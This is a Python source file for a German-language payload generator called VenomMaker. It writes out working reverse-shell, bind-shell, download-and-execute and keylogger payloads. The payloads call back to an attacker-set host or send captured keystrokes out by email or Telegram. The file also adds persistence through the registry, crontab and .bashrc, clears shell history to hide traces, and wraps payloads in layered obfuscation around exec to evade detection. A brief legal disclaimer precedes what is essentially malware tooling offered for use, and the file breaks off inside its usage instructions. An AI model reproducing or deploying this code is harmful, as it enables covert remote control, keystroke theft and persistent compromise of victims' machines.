#!/usr/bin/env python3
"""
VenomMaker - Advanced Payload Generator v2.0
"""

import os
import sys
import base64
import zlib
import hashlib
import random
import string
from datetime import datetime
from colorama import Fore, Style, init

init(autoreset=True)

class VenomMaker:
    def __init__(self):
        self.version = "2.0"
        self.payload_types = {
            "1": {
                "name": "Reverse Shell",
                "description": "Opfer verbindet zu deinem Server",
                "icon": "🔄"
            },
            "2": {
                "name": "Bind Shell",
                "description": "Öffnet Port auf Opfer, du verbindest dich",
                "icon": "🔗"
            },
            "3": {
                "name": "File Downloader",
                "description": "Lädt und führt Datei von URL aus",
                "icon": "📥"
            },
            "4": {
                "name": "Keylogger",
                "description": "Zeichnet Tastatureingaben auf",
                "icon": "⌨️"
            },
            "5": {
                "name": "Persistence",
                "description": "Sichert dauerhaften Zugriff",
                "icon": "♾️"
            },
            "6": {
                "name": "Encrypted Shell",
                "description": "Verschlüsselte Kommunikation",
                "icon": "🔒"
            },
            "7": {
                "name": "Multi-Handler",
                "description": "Verbinde zu mehreren Servern",
                "icon": "🌐"
            },
            "8": {
                "name": "Stealth Mode",
                "description": "Minimale Erkennung",
                "icon": "👻"
            }
        }
        
        self.obfuscation_levels = {
            "1": "Minimal (keine Obfuscation)",
            "2": "Basic (Variablen umbenennen)",
            "3": "Advanced (Base64 + Kompression)",
            "4": "Extreme (Mehrschichtige Obfuscation)"
        }
        
        self.platforms = {
            "1": "Linux/Unix",
            "2": "Windows",
            "3": "macOS",
            "4": "Cross-Platform"
        }

    def banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{Fore.GREEN}
    ╦  ╦╔═╗╔╗╔╔╦╗╔═╗╔╦╗╔═╗╦═╗
    ║  ║╠═╣║║║ ║║╠═╝ ║ ║ ║╠╦╝
    ╩═╝╩╩ ╩╝╚╝═╩╝╩  ╩ ╚═╝╩╚═
    ╔╦╗╔═╗╦ ╦╔╦╗╔═╗╔╗╔╔═╗╔═╗
    ║║║║ ║║ ║║║║║╣ ║║║║╣ ╚═╗
    ╩ ╩╚═╝╚═╝╩ ╩╚═╝╝╚╝╚═╝╚═╝
{Fore.WHITE}       >> ADVANCED PAYLOAD GENERATOR v{self.version} <<
{Fore.YELLOW}       -------------------------------------------
""")

    def ethical_warning(self):
        """Ethischer Disclaimer"""
        print(f"{Fore.RED}╔══════════════════════════════════════════════════════════╗")
        print(f"{Fore.RED}║                   WICHTIGE WARNUNG                      ║")
        print(f"{Fore.RED}╠══════════════════════════════════════════════════════════╣")
        print(f"{Fore.YELLOW}║  Diese Payloads sind NUR für autorisierte Tests!     ║")
        print(f"{Fore.YELLOW}║  Illegaler Einsatz ist STRAFBAR (§202a StGB)!        ║")
        print(f"{Fore.YELLOW}║                                                      ║")
        print(f"{Fore.YELLOW}║  ✅ Erlaubt: Eigene Systeme, CTFs, Labs               ║")
        print(f"{Fore.YELLOW}║  ❌ Verboten: Fremde Systeme, illegale Aktivitäten   ║")
        print(f"{Fore.RED}╚══════════════════════════════════════════════════════════╝")
        
        consent = input(f"\n{Fore.WHITE}[?] Verstanden und akzeptiert? (ja/NEIN): ").strip().lower()
        if consent != "ja":
            print(f"{Fore.RED}[!] Abbruch. Ethik-Bedingungen müssen akzeptiert werden.")
            return False
        
        return True

    def show_payload_menu(self):
        """Zeigt Payload-Auswahlmenü"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║        PAYLOAD TYPE SELECTION           ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════╝")
        
        for pid, ptype in self.payload_types.items():
            print(f"{Fore.WHITE}[{Fore.YELLOW}{pid}{Fore.WHITE}] {ptype['icon']} {ptype['name']:<15} - {ptype['description']}")
        
        print(f"\n{Fore.CYAN}════════════════════════════════════════════")
        print(f"{Fore.WHITE}[H] Hilfe  [B] Zurück  [99] Beenden")

    def get_payload_config(self, payload_type):
        """Sammelt Konfiguration für Payload"""
        config = {}
        
        print(f"\n{Fore.CYAN}[*] Konfiguriere {self.payload_types[payload_type]['name']}")
        
        # Allgemeine Konfiguration
        config['filename'] = input(f"{Fore.GREEN}[?] Dateiname (z.B. update.py): ").strip()
        if not config['filename']:
            config['filename'] = f"payload_{datetime.now().strftime('%H%M%S')}.py"
        
        if not config['filename'].endswith('.py'):
            config['filename'] += '.py'
        
        # Plattform-Auswahl
        print(f"\n{Fore.CYAN}[*] Ziel-Plattform:")
        for pid, platform_name in self.platforms.items():
            print(f"  {Fore.WHITE}[{pid}] {platform_name}")
        
        platform_choice = input(f"{Fore.GREEN}[?] Plattform (1-4): ").strip()
        config['platform'] = self.platforms.get(platform_choice, "Cross-Platform")
        
        # Obfuscation-Level
        print(f"\n{Fore.CYAN}[*] Obfuscation Level:")
        for oid, odesc in self.obfuscation_levels.items():
            print(f"  {Fore.WHITE}[{oid}] {odesc}")
        
        obf_choice = input(f"{Fore.GREEN}[?] Obfuscation (1-4): ").strip()
        config['obfuscation'] = self.obfuscation_levels.get(obf_choice, "Minimal")
        
        # Payload-spezifische Konfiguration
        if payload_type in ['1', '6', '7']:  # Reverse Shell Varianten
            config['lhost'] = input(f"{Fore.GREEN}[?] Deine IP (LHOST): ").strip()
            config['lport'] = input(f"{Fore.GREEN}[?] Port (LPORT, z.B. 4444): ").strip() or "4444"
            
            if payload_type == '7':  # Multi-Handler
                config['backup_host'] = input(f"{Fore.GREEN}[?] Backup IP (optional): ").strip()
                config['backup_port'] = input(f"{Fore.GREEN}[?] Backup Port (optional): ").strip()
        
        elif payload_type == '2':  # Bind Shell
            config['rport'] = input(f"{Fore.GREEN}[?] Port auf Opfer (RPORT): ").strip() or "4444"
        
        elif payload_type == '3':  # Downloader
            config['url'] = input(f"{Fore.GREEN}[?] Download URL: ").strip()
            config['execute'] = input(f"{Fore.GREEN}[?] Nach Download ausführen? (y/n): ").strip().lower() == 'y'
        
        elif payload_type == '4':  # Keylogger
            config['log_method'] = input(f"{Fore.GREEN}[?] Log-Methode (file/email/telegram): ").strip()
            if config['log_method'] == 'email':
                config['email'] = input(f"{Fore.GREEN}[?] Ziel-Email: ").strip()
            elif config['log_method'] == 'telegram':
                config['bot_token'] = input(f"{Fore.GREEN}[?] Telegram Bot Token: ").strip()
                config['chat_id'] = input(f"{Fore.GREEN}[?] Chat ID: ").strip()
        
        elif payload_type == '5':  # Persistence
            config['method'] = input(f"{Fore.GREEN}[?] Persistence-Methode (registry/startup/cron): ").strip()
            config['trigger'] = input(f"{Fore.GREEN}[?] Trigger (boot/login/idle): ").strip()
        
        # Erweiterte Optionen
        print(f"\n{Fore.CYAN}[*] Erweiterte Optionen:")
        config['add_delay'] = input(f"{Fore.GREEN}[?] Zufällige Verzögerung? (y/n): ").strip().lower() == 'y'
        config['add_persistence'] = input(f"{Fore.GREEN}[?] Auto-Persistence? (y/n): ").strip().lower() == 'y'
        config['add_stealth'] = input(f"{Fore.GREEN}[?] Stealth-Modus? (y/n): ").strip().lower() == 'y'
        
        return config

    def generate_reverse_shell(self, config):
        """Generiert Reverse Shell Payload"""
        template = f'''#!/usr/bin/env python3
"""
{self.payload_types['1']['name']} - {self.payload_types['1']['description']}
Generated by VenomMaker v{self.version}
Timestamp: {datetime.now().isoformat()}
"""

import socket
import subprocess
import os
import sys
import time
import platform
import random
import threading

# ===== CONFIGURATION =====
LHOST = "{config.get('lhost', '127.0.0.1')}"
LPORT = {config.get('lport', 4444)}
PLATFORM = "{config.get('platform', 'Cross-Platform')}"
VERSION = "{self.version}"

# ===== STEALTH SETTINGS =====
STEALTH_MODE = {str(config.get('add_stealth', False)).lower()}
ADD_DELAY = {str(config.get('add_delay', False)).lower()}
ADD_PERSISTENCE = {str(config.get('add_persistence', False)).lower()}

# ===== SHELL CONFIG =====
def get_shell_config():
    """Returns platform-specific shell configuration"""
    system = platform.system().lower()
    
    if system == "windows":
        return {{
            "shell": "cmd.exe",
            "args": [],
            "encoding": "cp850"
        }}
    else:
        # Try common Unix shells
        shells = [
            ("/bin/bash", ["-i"]),
            ("/bin/sh", ["-i"]),
            ("/usr/bin/bash", ["-i"]),
            ("/bin/zsh", ["-i"])
        ]
        
        for shell_path, args in shells:
            if os.path.exists(shell_path):
                return {{
                    "shell": shell_path,
                    "args": args,
                    "encoding": "utf-8"
                }}
        
        # Fallback
        return {{
            "shell": "/bin/sh",
            "args": ["-i"],
            "encoding": "utf-8"
        }}

# ===== STEALTH FUNCTIONS =====
def random_delay():
    """Adds random delay to avoid pattern detection"""
    if ADD_DELAY:
        delay = random.uniform(0.5, 5.0)
        time.sleep(delay)

def cleanup_traces():
    """Cleans up traces in various systems"""
    if STEALTH_MODE:
        try:
            # Clear command history
            if platform.system() != "Windows":
                os.system("history -c && history -w")
            
            # Remove temporary files
            if hasattr(sys, 'executable'):
                temp_file = sys.executable + ".tmp"
                if os.path.exists(temp_file):
                    os.remove(temp_file)
        except:
            pass

def add_persistence():
    """Adds persistence mechanism"""
    if not ADD_PERSISTENCE:
        return
    
    system = platform.system().lower()
    
    try:
        if system == "windows":
            # Windows persistence via registry
            import winreg
            
            key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            
        elif system in ["linux", "darwin"]:
            # Unix persistence via crontab or startup
            current_file = os.path.abspath(__file__)
            
            # Try crontab
            crontab_line = f"@reboot python3 {{current_file}}"
            os.system(f'(crontab -l 2>/dev/null; echo "{crontab_line}") | crontab -')
            
            # Try .bashrc / .zshrc
            rc_file = os.path.expanduser("~/.bashrc")
            if os.path.exists(rc_file):
                with open(rc_file, "a") as f:
                    f.write(f"\\npython3 {{current_file}} &\n")
    
    except Exception as e:
        pass  # Silently fail

# ===== CONNECTION MANAGER =====
class ConnectionManager:
    def __init__(self):
        self.socket = None
        self.connected = False
        self.reconnect_attempts = 0
        self.max_attempts = 10
        self.reconnect_delay = 5
        
    def connect(self):
        """Establishes connection to server"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.settimeout(30)
            self.socket.connect((LHOST, LPORT))
            
            # Send identification
            system_info = platform.platform()
            self.socket.send(f"[+] Connected from {{system_info}}\\n".encode())
            
            self.connected = True
            self.reconnect_attempts = 0
            return True
            
        except Exception as e:
            return False
    
    def reconnect(self):
        """Attempts to reconnect"""
        while self.reconnect_attempts < self.max_attempts and not self.connected:
            self.reconnect_attempts += 1
            print(f"[*] Reconnection attempt {{self.reconnect_attempts}}/{{self.max_attempts}}")
            
            if self.connect():
                return True
            
            time.sleep(self.reconnect_delay)
        
        return False

# ===== MAIN SHELL FUNCTION =====
def start_shell(conn_manager):
    """Starts the interactive shell"""
    shell_config = get_shell_config()
    
    try:
        # Redirect streams (Unix only)
        if platform.system().lower() != "windows":
            os.dup2(conn_manager.socket.fileno(), 0)  # stdin
            os.dup2(conn_manager.socket.fileno(), 1)  # stdout
            os.dup2(conn_manager.socket.fileno(), 2)  # stderr
        
        # Start shell
        subprocess.call([shell_config["shell"]] + shell_config["args"])
        
    except Exception as e:
        print(f"[-] Shell error: {{e}}")
    finally:
        conn_manager.connected = False

# ===== MAIN EXECUTION =====
def main():
    """Main execution flow"""
    
    # Initial stealth measures
    random_delay()
    cleanup_traces()
    
    # Add persistence if requested
    add_persistence()
    
    # Setup connection manager
    conn_manager = ConnectionManager()
    
    # Main connection loop
    while True:
        try:
            if conn_manager.connect():
                print(f"[+] Successfully connected to {{LHOST}}:{{LPORT}}")
                start_shell(conn_manager)
            else:
                print(f"[-] Connection failed")
                
                if conn_manager.reconnect():
                    print(f"[+] Reconnected successfully")
                    start_shell(conn_manager)
                else:
                    print(f"[-] Max reconnection attempts reached")
                    break
                    
        except KeyboardInterrupt:
            print("\\n[*] Interrupted by user")
            break
        except Exception as e:
            print(f"[-] Unexpected error: {{e}}")
            time.sleep(5)

# ===== ENTRY POINT =====
if __name__ == "__main__":
    # Add another random delay before starting
    if ADD_DELAY:
        initial_delay = random.uniform(1, 10)
        time.sleep(initial_delay)
    
    # Run main function
    main()
'''
        return template

    def generate_bind_shell(self, config):
        """Generiert Bind Shell Payload"""
        template = f'''#!/usr/bin/env python3
"""
{self.payload_types['2']['name']} - {self.payload_types['2']['description']}
Generated by VenomMaker v{self.version}
"""

import socket
import subprocess
import os
import sys
import threading
import platform

PORT = {config.get('rport', 4444)}
MAX_CONNECTIONS = 5

def handle_client(client_socket, client_address):
    """Handles incoming client connection"""
    try:
        print(f"[+] Connection from {{client_address[0]}}:{{client_address[1]}}")
        
        # Get platform-specific shell
        system = platform.system().lower()
        if system == "windows":
            shell = "cmd.exe"
            args = []
        else:
            shell = "/bin/bash"
            args = ["-i"]
        
        # Send banner
        banner = f"Bind Shell - {{platform.platform()}}\\n"
        client_socket.send(banner.encode())
        
        # Redirect streams (Unix only)
        if system != "windows":
            os.dup2(client_socket.fileno(), 0)
            os.dup2(client_socket.fileno(), 1)
            os.dup2(client_socket.fileno(), 2)
        
        # Start shell
        subprocess.call([shell] + args)
        
    except Exception as e:
        print(f"[-] Client error: {{e}}")
    finally:
        client_socket.close()
        print(f"[-] Connection closed")

def start_server():
    """Starts the bind shell server"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind(('0.0.0.0', PORT))
        server.listen(MAX_CONNECTIONS)
        
        print(f"[*] Bind Shell listening on 0.0.0.0:{{PORT}}")
        print(f"[*] Platform: {{platform.platform()}}")
        
        while True:
            client, addr = server.accept()
            
            # Handle each client in a separate thread
            client_thread = threading.Thread(
                target=handle_client,
                args=(client, addr),
                daemon=True
            )
            client_thread.start()
            
    except PermissionError:
        print(f"[-] Permission denied. Need root/admin privileges for port {{PORT}}")
    except Exception as e:
        print(f"[-] Server error: {{e}}")
    finally:
        server.close()

if __name__ == "__main__":
    start_server()
'''
        return template

    def generate_downloader(self, config):
        """Generiert File Downloader"""
        template = f'''#!/usr/bin/env python3
"""
{self.payload_types['3']['name']} - {self.payload_types['3']['description']}
"""

import requests
import subprocess
import os
import tempfile
import sys
import platform
import hashlib

DOWNLOAD_URL = "{config.get('url', 'http://example.com/payload.exe')}"
EXECUTE_AFTER_DOWNLOAD = {str(config.get('execute', True)).lower()}

def download_file(url):
    """Downloads file from URL"""
    try:
        print(f"[*] Downloading from {{url}}...")
        
        headers = {{
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }}
        
        response = requests.get(url, headers=headers, timeout=30, stream=True)
        response.raise_for_status()
        
        # Create temp file
        temp_dir = tempfile.gettempdir()
        file_hash = hashlib.md5(url.encode()).hexdigest()[:8]
        
        if "windows" in platform.system().lower():
            file_ext = ".exe"
        else:
            file_ext = ".bin"
        
        file_path = os.path.join(temp_dir, f"tmp_{{file_hash}}{{file_ext}}")
        
        # Write file
        with open(file_path, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                if chunk:
                    f.write(chunk)
        
        print(f"[+] File saved: {{file_path}}")
        print(f"[+] Size: {{os.path.getsize(file_path)}} bytes")
        
        # Set executable permissions (Unix)
        if platform.system().lower() != "windows":
            os.chmod(file_path, 0o755)
        
        return file_path
        
    except Exception as e:
        print(f"[-] Download failed: {{e}}")
        return None

def execute_file(file_path):
    """Executes downloaded file"""
    try:
        print(f"[*] Executing {{file_path}}...")
        
        system = platform.system().lower()
        
        if system == "windows":
            # Windows
            CREATE_NO_WINDOW = 0x08000000
            subprocess.Popen(
                [file_path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                creationflags=CREATE_NO_WINDOW
            )
        else:
            # Unix/Linux/macOS
            subprocess.Popen(
                [file_path],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL
            )
        
        print(f"[+] Execution started")
        return True
        
    except Exception as e:
        print(f"[-] Execution failed: {{e}}")
        return False

def cleanup(file_path):
    """Cleans up temporary files"""
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
            print(f"[*] Cleaned up {{file_path}}")
    except:
        pass

def main():
    """Main function"""
    print(f"[*] File Downloader started")
    print(f"[*] Platform: {{platform.platform()}}")
    print(f"[*] Target URL: {{DOWNLOAD_URL}}")
    
    # Download file
    file_path = download_file(DOWNLOAD_URL)
    
    if not file_path:
        print(f"[-] Cannot continue without downloaded file")
        return
    
    # Execute if requested
    if EXECUTE_AFTER_DOWNLOAD:
        if not execute_file(file_path):
            cleanup(file_path)
    else:
        print(f"[*] File downloaded but not executed")
        print(f"[*] Location: {{file_path}}")

if __name__ == "__main__":
    main()
'''
        return template

    def generate_keylogger(self, config):
        """Generiert Keylogger"""
        template = f'''#!/usr/bin/env python3
"""
{self.payload_types['4']['name']} - {self.payload_types['4']['description']}
WARNING: Use only on systems you own or have permission to test!
"""

import os
import sys
import time
import datetime
import platform
from threading import Thread

# Configuration
LOG_METHOD = "{config.get('log_method', 'file')}"
LOG_FILE = "keylog.txt"
FLUSH_INTERVAL = 60  # seconds
MAX_LOG_SIZE = 1024 * 1024  # 1 MB

# Email configuration (if using email logging)
EMAIL_CONFIG = {{
    "smtp_server": "smtp.gmail.com",
    "smtp_port": 587,
    "email": "{config.get('email', '')}",
    "password": ""
}}

# Telegram configuration (if using telegram logging)
TELEGRAM_CONFIG = {{
    "bot_token": "{config.get('bot_token', '')}",
    "chat_id": "{config.get('chat_id', '')}"
}}

class KeyLogger:
    def __init__(self):
        self.buffer = []
        self.last_flush = time.time()
        self.running = True
        
    def log_key(self, key):
        """Logs a keypress with timestamp"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_entry = f"[{{timestamp}}] {{key}}\\n"
        self.buffer.append(log_entry)
        
        # Auto-flush if buffer too large or time elapsed
        if (len(self.buffer) > 100 or 
            (time.time() - self.last_flush) > FLUSH_INTERVAL):
            self.flush_logs()
    
    def flush_logs(self):
        """Flushes logs to configured destination"""
        if not self.buffer:
            return
        
        log_data = "".join(self.buffer)
        self.buffer = []
        self.last_flush = time.time()
        
        try:
            if LOG_METHOD == "file":
                self._log_to_file(log_data)
            elif LOG_METHOD == "email":
                self._log_to_email(log_data)
            elif LOG_METHOD == "telegram":
                self._log_to_telegram(log_data)
        except Exception as e:
            print(f"Log flush error: {{e}}")
    
    def _log_to_file(self, log_data):
        """Logs to local file"""
        try:
            # Rotate log if too large
            if os.path.exists(LOG_FILE):
                if os.path.getsize(LOG_FILE) > MAX_LOG_SIZE:
                    backup_file = f"{{LOG_FILE}}.{{int(time.time())}}"
                    os.rename(LOG_FILE, backup_file)
            
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(log_data)
        except:
            pass
    
    def _log_to_email(self, log_data):
        """Sends logs via email"""
        try:
            import smtplib
            from email.mime.text import MIMEText
            
            msg = MIMEText(log_data)
            msg['Subject'] = f"Keylogger Report {{datetime.datetime.now().strftime('%Y-%m-%d')}}"
            msg['From'] = EMAIL_CONFIG['email']
            msg['To'] = EMAIL_CONFIG['email']
            
            with smtplib.SMTP(EMAIL_CONFIG['smtp_server'], EMAIL_CONFIG['smtp_port']) as server:
                server.starttls()
                server.login(EMAIL_CONFIG['email'], EMAIL_CONFIG['password'])
                server.send_message(msg)
        except:
            pass
    
    def _log_to_telegram(self, log_data):
        """Sends logs via Telegram"""
        try:
            import requests
            
            # Split long messages
            max_length = 4000
            for i in range(0, len(log_data), max_length):
                chunk = log_data[i:i+max_length]
                
                url = f"https://api.telegram.org/bot{{TELEGRAM_CONFIG['bot_token']}}/sendMessage"
                data = {{
                    'chat_id': TELEGRAM_CONFIG['chat_id'],
                    'text': chunk
                }}
                
                requests.post(url, data=data, timeout=10)
        except:
            pass
    
    def cleanup(self):
        """Cleanup before exit"""
        self.flush_logs()
        
        # Remove log file if empty
        try:
            if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) == 0:
                os.remove(LOG_FILE)
        except:
            pass

def get_platform_keylogger():
    """Returns platform-specific keylogger implementation"""
    system = platform.system().lower()
    
    if system == "windows":
        from ctypes import windll
        
        class WindowsKeyLogger(KeyLogger):
            def __init__(self):
                super().__init__()
                self.user32 = windll.user32
                self.current_window = None
            
            def get_current_window(self):
                """Gets current active window title"""
                try:
                    hwnd = self.user32.GetForegroundWindow()
                    length = self.user32.GetWindowTextLengthW(hwnd)
                    buff = (65536)(length + 1)
                    self.user32.GetWindowTextW(hwnd, buff, length + 1)
                    return buff.value
                except:
                    return "Unknown"
            
            def run(self):
                """Main keylogging loop for Windows"""
                import win32api
                import win32con
                
                while self.running:
                    try:
                        # Check for window change
                        new_window = self.get_current_window()
                        if new_window != self.current_window:
                            self.current_window = new_window
                            self.log_key(f"\\n[WINDOW] {{new_window}}\\n")
                        
                        # Check all keys
                        for i in range(1, 256):
                            if win32api.GetAsyncKeyState(i) & 1:
                                # Key pressed
                                key = self._translate_key(i)
                                if key:
                                    self.log_key(key)
                        
                        time.sleep(0.01)
                    
                    except Exception as e:
                        time.sleep(1)
                
                self.cleanup()
            
            def _translate_key(self, key_code):
                """Translates key codes to characters"""
                # Special keys
                special_keys = {{
                    8: "[BACKSPACE]",
                    9: "[TAB]",
                    13: "\\n",
                    27: "[ESC]",
                    32: " ",
                    46: "[DEL]"
                }}
                
                if key_code in special_keys:
                    return special_keys[key_code]
                
                # Character keys
                try:
                    return chr(key_code)
                except:
                    return f"[KEY:{{key_code}}]"
        
        return WindowsKeyLogger()
    
    else:
        # Unix/Linux/macOS (requires appropriate permissions)
        class UnixKeyLogger(KeyLogger):
            def run(self):
                """Unix keylogger (conceptual)"""
                print("[!] Unix keylogger requires X11 or similar")
                print("[!] This is a placeholder implementation")
                
                # In reality, you would use:
                # - python-xlib for X11 systems
                # - Quartz Event Taps for macOS
                # - Appropriate permissions are required
                
                while self.running:
                    self.log_key("[UNIX_KEYLOGGER_PLACEHOLDER]")
                    time.sleep(10)
                
                self.cleanup()
        
        return UnixKeyLogger()

def main():
    """Main function"""
    print("[*] Keylogger starting...")
    print(f"[*] Platform: {{platform.platform()}}")
    print(f"[*] Log method: {{LOG_METHOD}}")
    
    # Check permissions
    if platform.system().lower() != "windows":
        print("[!] Unix keyloggers often require root/sudo permissions")
        print("[!] or specific accessibility permissions")
    
    # Create and run keylogger
    keylogger = get_platform_keylogger()
    
    try:
        # Run in background thread
        thread = Thread(target=keylogger.run, daemon=True)
        thread.start()
        
        print("[+] Keylogger running in background")
        print("[+] Press Ctrl+C to stop")
        
        # Keep main thread alive
        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\\n[*] Stopping keylogger...")
        keylogger.running = False
        thread.join(timeout=5)
        print("[+] Keylogger stopped")

if __name__ == "__main__":
    main()
'''
        return template

    def obfuscate_payload(self, payload, level):
        """Obfuskiert den Payload basierend auf Level"""
        if level == "1":  # Minimal
            return payload
        
        elif level == "2":  # Basic - Variablen umbenennen
            # Einfache Variablen-Ersetzung
            replacements = {
                "socket": "s0cket",
                "subprocess": "subpr0cess",
                "platform": "pl4tform",
                "sys": "syst3m",
                "os": "0peratingSystem"
            }
            
            for old, new in replacements.items():
                payload = payload.replace(old, new)
            
            return payload
        
        elif level == "3":  # Advanced - Base64 + Kompression
            # Komprimiere und encodiere
            compressed = zlib.compress(payload.encode())
            encoded = base64.b64encode(compressed).decode()
            
            wrapper = f'''#!/usr/bin/env python3
import base64, zlib, sys, os

# Obfuscated payload
PAYLOAD = "{encoded}"

def execute():
    """Decodes and executes the payload"""
    try:
        decoded = base64.b64decode(PAYLOAD)
        decompressed = zlib.decompress(decoded)
        exec(decompressed.decode())
    except Exception as e:
        print(f"Execution error: {{e}}")

if __name__ == "__main__":
    execute()
'''
            return wrapper
        
        elif level == "4":  # Extreme - Mehrschichtig
            # Mehrere Schichten von Obfuscation
            layer1 = payload.encode()
            
            # Schicht 1: XOR-Verschlüsselung
            key = random.randint(1, 255)
            xor_encrypted = bytes([b ^ key for b in layer1])
            
            # Schicht 2: Base85 Encoding
            import base64
            b85_encoded = base64.b85encode(xor_encrypted).decode()
            
            # Schicht 3: Rot13 auf den String
            rot13_encoded = self._rot13(b85_encoded)
            
            wrapper = f'''#!/usr/bin/env python3
import base64, sys, os

# Multi-layer obfuscated payload
OBFUSCATED = """{rot13_encoded}"""
KEY = {key}

def rot13_decode(text):
    """ROT13 decoder"""
    result = []
    for char in text:
        if 'A' <= char <= 'Z':
            result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
        elif 'a' <= char <= 'z':
            result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
        else:
            result.append(char)
    return ''.join(result)

def execute():
    """Decodes and executes multi-layer payload"""
    try:
        # Layer 3: ROT13 decode
        layer1 = rot13_decode(OBFUSCATED)
        
        # Layer 2: Base85 decode
        layer2 = base64.b85decode(layer1.encode())
        
        # Layer 1: XOR decrypt
        layer3 = bytes([b ^ KEY for b in layer2])
        
        # Execute
        exec(layer3.decode())
        
    except Exception as e:
        print(f"Multi-layer decode error: {{e}}")

if __name__ == "__main__":
    execute()
'''
            return wrapper
        
        return payload

    def _rot13(self, text):
        """ROT13 encoding"""
        result = []
        for char in text:
            if 'A' <= char <= 'Z':
                result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
            elif 'a' <= char <= 'z':
                result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
            else:
                result.append(char)
        return ''.join(result)

    def generate_payload(self, payload_type, config):
        """Generiert den Payload basierend auf Typ und Konfiguration"""
        payload_generators = {
            "1": self.generate_reverse_shell,
            "2": self.generate_bind_shell,
            "3": self.generate_downloader,
            "4": self.generate_keylogger
        }
        
        if payload_type not in payload_generators:
            print(f"{Fore.RED}[ERROR] Unbekannter Payload-Typ")
            return None
        
        # Generiere Roh-Payload
        raw_payload = payload_generators[payload_type](config)
        
        # Obfuscate
        obfuscated_payload = self.obfuscate_payload(raw_payload, config['obfuscation'])
        
        return obfuscated_payload

    def save_payload(self, payload, filename):
        """Speichert den Payload in einer Datei"""
        try:
            with open(filename, "w", encoding="utf-8") as f:
                f.write(payload)
            
            # Setze Ausführungsrechte (Unix)
            if os.name != 'nt':
                os.chmod(filename, 0o755)
            
            # Berechne Hash
            file_hash = hashlib.sha256(payload.encode()).hexdigest()
            
            return file_hash
            
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Konnte Datei nicht speichern: {e}")
            return None

    def show_usage_instructions(self, payload_type, config, filename, file_hash):
        """Zeigt Anleitung basierend auf Payload-Typ"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║              USAGE INSTRUCTIONS                         ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════╝")
        
        ptype = self.payload_types[payload_type]
        print(f"\n{Fore.YELLOW}Payload: {ptype['icon']} {ptype['name']}")
        print(f"{Fore.WHITE}Datei: {Fore.GREEN}{filename}")
        print(f"{Fore.WHITE}SHA256: {Fore.CYAN}{file_hash}")
        print(f"{Fore.WHITE}Plattform: {Fore.YELLOW}{config['platform']}")
        print(f"{Fore.WHITE}Obfuscation: {Fore.YELLOW}{config['obfuscation']}")
        
        print(f"\n{Fore.CYAN}┌──────────────────────────────────────────────────────────┐")
        
        if payload_type == "1":  # Reverse Shell
            print(f"{Fore.WHITE}│ 1. Starte Listener auf deinem System:                │")
            print(f"{Fore.CYAN}│    {Fore.WHITE}nc -lvnp {config.get('lport', 4444)}                          │")
            print(f"{Fore.WHITE}│ 2. Übertrage '{filename}' auf Zielsystem            │")
            print(f"{Fore.WHITE}│ 3. Führe auf Zielsystem aus:                        │")
            print(f"{Fore.CYAN}│    {Fore.WHITE}python3 {filename}                                    │")
            print(f"{Fore.WHITE}│ 4. Bei Erfolg: Shell-Zugriff auf Zielsystem         │")
            
        elif payload_type == "2":  # Bind Shell
            print(f"{Fore.WHITE}│ 1. Übertrage '{filename}' auf Zielsystem            │")
            print(f"{Fore.WHITE}│ 2. Führe auf Zielsystem aus:                        │")
            print(f"{Fore.CYAN}│    {Fore.WHITE}python3 {filename}                                    │")
            print(f"{Fore.WHITE}│ 3. Warte bis Payload gestartet ist                  │")
            print(f"{Fore.WHITE}│ 4. Verbinde von deinem System:                      │")
            print(f"{Fore.CYAN}│    {Fore.WHITE}nc <ZIEL-IP> {config.get('rport', 4444)}                         │")
            
        elif payload_type == "3":  # Downloader
            print(f"{Fore.WHITE}│ 1. Stelle sicher, dass die Datei unter URL erreichbar │")
            print(f"{Fore.WHITE}│    ist: {config.get('url', 'URL')}                   │")
            print(f"{Fore.WHITE}│ 2. Übertrage '{filename}' auf Zielsystem            │")
            print(f"{Fore.WHITE}│ 3. Führe auf Zielsystem aus:                        │")
            print(f"{Fore.CYAN}│    {Fore.WHITE}python3 {filename}                                    │")
            print(f"{Fore.WHITE}│ 4. Datei wird automatisch heruntergeladen und        │")
            print(f"{Fore.WHITE}│    {Fore.RED}ausgeführt (wenn konfiguriert){Fore.WHITE}                  │")
            
        elif payload_type == "4":  # Keylogger
            print(f"{Fore.WHITE}│ 1. Stelle Logging-Methode ein (Email/Telegram)      │")
            print(f"{Fore.WHITE}│ 2. Übertrage '{filename}' auf Zielsystem            │")
            print(f"{Fore.WHITE}│ 3. Führe mit entsprechender Berechtigung aus:       │")
            if config['platform'] != "Windows":
                print(f"{Fore.CYAN}│    {Fore.WHITE}sudo python3 {filename}                              │")
            else:
                print(f"{Fore.CYAN}│    {Fore.WHITE}python3 {filename}                                    │")
